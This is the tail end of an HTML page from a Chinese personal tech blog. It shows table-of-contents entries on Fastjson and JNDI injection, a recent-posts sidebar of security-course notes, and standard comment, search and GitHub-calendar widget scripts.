class="toc-number">5.4.1.3.</span> <span class="toc-text">3、使用Fastjson进行数据转换（对象转Json）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E6%95%B0%E6%8D%AE%E8%BD%AC%E6%8D%A2-Json%E8%BD%AC%E5%AF%B9%E8%B1%A1"><span class="toc-number">5.4.1.4.</span> <span class="toc-text">4、数据转换(Json转对象)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaEE%E5%BA%94%E7%94%A8-JNDI%E6%B3%A8%E5%85%A5-RMI%E6%9C%8D%E5%8A%A1-LDAP%E6%9C%8D%E5%8A%A1-JDK%E7%BB%95%E8%BF%87-%E8%B0%83%E7%94%A8%E9%93%BE%E7%B1%BB"><span class="toc-number">5.5.</span> <span class="toc-text">JavaEE应用&amp;JNDI注入&amp;RMI服务&amp;LDAP服务&amp;JDK绕过&amp;调用链类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8-JNDI-Injection"><span class="toc-number">5.5.1.</span> <span class="toc-text">JNDI远程调用-JNDI-Injection</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/1288cce5.html" title="小迪安全--安全开发下篇(4)"><img src="/img/xiao_f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="小迪安全--安全开发下篇(4)"/></a><div class="content"><a class="title" href="/posts/1288cce5.html" title="小迪安全--安全开发下篇(4)">小迪安全--安全开发下篇(4)</a><time datetime="2025-06-12T13:17:11.319Z" title="发表于 2025-06-12 21:17:11">2025-06-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/b4ffc751.html" title="小迪安全--安全开发上篇(3)"><img src="/img/xiao_f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="小迪安全--安全开发上篇(3)"/></a><div class="content"><a class="title" href="/posts/b4ffc751.html" title="小迪安全--安全开发上篇(3)">小迪安全--安全开发上篇(3)</a><time datetime="2025-06-12T13:08:57.606Z" title="发表于 2025-06-12 21:08:57">2025-06-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/dba72746.html" title="小迪安全--信息打点(2)"><img src="/img/xiao_f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="小迪安全--信息打点(2)"/></a><div class="content"><a class="title" href="/posts/dba72746.html" title="小迪安全--信息打点(2)">小迪安全--信息打点(2)</a><time datetime="2025-05-18T02:57:49.848Z" title="发表于 2025-05-18 10:57:49">2025-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/944d69ee.html" title="云计算方向-Ansible搭建wordpress"><img src="/img/cloud-com.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="云计算方向-Ansible搭建wordpress"/></a><div class="content"><a class="title" href="/posts/944d69ee.html" title="云计算方向-Ansible搭建wordpress">云计算方向-Ansible搭建wordpress</a><time datetime="2025-05-14T02:48:38.000Z" title="发表于 2025-05-14 10:48:38">2025-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/a182640a.html" title="云计算方向-2023年金砖一带一路职业技能大赛云计算赛题"><img src="/img/cloud-com.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="云计算方向-2023年金砖一带一路职业技能大赛云计算赛题"/></a><div class="content"><a class="title" href="/posts/a182640a.html" title="云计算方向-2023年金砖一带一路职业技能大赛云计算赛题">云计算方向-2023年金砖一带一路职业技能大赛云计算赛题</a><time datetime="2025-05-14T02:48:37.000Z" title="发表于 2025-05-14 10:48:37">2025-05-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/bottom-bg.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2025 By GoldY</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoo-ashen-rho.vercel.app/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const init = (el = document, path = location.pathname) => {
    twikoo.init({
      el: el.querySelector('#twikoo-wrap'),
      envId: 'https://twikoo-ashen-rho.vercel.app/',
      region: '',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      },
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    

    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
      if (el.children.length) {
        el.innerHTML = ''
        el.classList.add('no-comment')
      }
    })
  }

  const loadTwikoo = (el, path) => {
    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(() => init(el, path))
  }

  if (isShuoshuo) {
    'Twikoo' === 'Twikoo'
      ? window.shuoshuoComment = { loadComment: loadTwikoo }
      : window.loadOtherComment = loadTwikoo
    return
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start -->
  <script data-pjax src="/js/hexo_githubcalendar.js"></script>
  <script data-pjax>
        function GithubCalendarConfig(){
            var git_githubapiurl ="https://githubcalendarapi.shiguang666.eu.org/api?user=yuwenjin666";
            var git_color =['#ebedf0', '#a2f7af', '#6ce480', '#54ad63', '#469252', '#31753c', '#1f5f2a', '#13531f', '#084111', '#032b09', '#000000'];
            var git_user ="yuwenjin666";
            var parent_div_git = document.getElementById('recent-posts');
            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
            if(parent_div_git && location.pathname =='/'){
                console.log("已挂载hexo-github-calendar https://github.com/Barry-Flynn/hexo-github-calendar");
                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
            };
            GithubCalendar(git_githubapiurl,git_color,git_user)
        }
        if(document.getElementById('recent-posts')){
            GithubCalendarConfig()
        }
    </script>
    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
    <style></style><!-- hexo injector body_end end --></body></html>